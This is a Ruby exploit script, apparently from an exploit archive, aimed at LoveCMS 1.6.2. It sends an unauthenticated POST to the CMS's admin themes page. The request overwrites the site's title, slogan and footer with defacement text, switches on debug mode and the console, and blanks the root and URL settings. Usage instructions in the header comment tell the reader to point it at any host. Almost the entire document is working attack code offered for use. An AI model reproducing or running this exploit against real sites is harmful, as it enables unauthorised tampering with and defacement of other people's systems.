LoveCMS 1.6.2 Final Update Settings Remote Exploit
==================================================



#!/usr/bin/ruby
#
## Exploit by PoMdaPiMp!
## ---------------------
##
##   LoveCMS Exploit Series
##   Episode 3: changing site settings ...
##
##   Description: Simply change the site settings !
##
##   Usage: ./LoveCMS_3_settings.rb <host>
##   Ex:    ./LoveCMS_2_themes.rb http://site.com/lovecms/
##
##   Tested on: lovecms_1.6.2_final (MacOS X, Xampp)
#

require &#039;net/http&#039;
require &#039;uri&#039;

@host = &#039;http://127.0.0.1/lovecms_1.6.2_final/lovecms/&#039;
@post_vars = {}
@post_vars[&#039;submit&#039;] = 1
@post_vars[&#039;pagetitle&#039;] = &#039;P4g3T1t1le&#039;
@post_vars[&#039;sitename&#039;] = &#039;SiteN4me&#039;
@post_vars[&#039;slogan&#039;] = &#039;By PoMdaPiMp.&#039;
@post_vars[&#039;footer&#039;] = &#039;PoMdaPiMp was here.&#039;
@post_vars[&#039;description&#039;] = &#039;Ruby is a gift.&#039;
@post_vars[&#039;keywords&#039;] = &#039;PoMdaPiMp, hack&#039;
@post_vars[&#039;encoding&#039;] = &#039;utf-8&#039;
@post_vars[&#039;tips&#039;] = &#039;off&#039;
@post_vars[&#039;console&#039;] = &#039;on&#039;
@post_vars[&#039;debugmode&#039;] = &#039;on&#039;
@post_vars[&#039;module&#039;] = 2
@post_vars[&#039;love_root&#039;] = &#039;&#039;
@post_vars[&#039;love_url&#039;] = &#039;&#039;

@host = ARGV[0] if ARGV[0]
@host += @host[-1, 1].to_s != &#039;/&#039; ? &#039;/&#039; : &#039;&#039;

if @host
  # --
  puts " + LoveCMS Exploit Series. #3: Messing with settings."
  puts
  puts " : Attacking host: " + @host

  # --
  # Changing settings
  res = Net::HTTP.post_form(URI.parse(@host + &#039;system/admin/themes.php&#039;),
                            @post_vars)
  puts " :: Values set."
  @post_vars.each do |k, v|
    puts "    " + k.to_s + " > " + v.to_s
  end

  # --
  puts
  puts " - Visit " + @host
end



